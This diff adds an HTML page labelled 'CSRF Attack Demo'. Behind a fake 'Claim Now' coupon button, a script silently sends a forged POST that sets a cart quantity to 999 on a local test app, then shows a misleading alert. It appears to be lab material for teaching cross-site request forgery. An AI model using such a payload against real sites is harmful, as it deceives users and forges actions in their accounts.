@@ -1,0 +1,20 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>CSRF Attack Demo</title>
+</head>
+<body>
+    <h1>Click the button to "Redeem a Free Coupon"</h1>
+    <button onclick="sendCSRF()">Claim Now</button>
+    <script>
+        function sendCSRF() {
+            fetch('http://127.0.0.1:5000/update_cart', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+                body: 'item=Pizza&quantity=999'
+            });
+            alert("Your cart has been updated!");
+        }
+    </script>
+</body>
+</html>
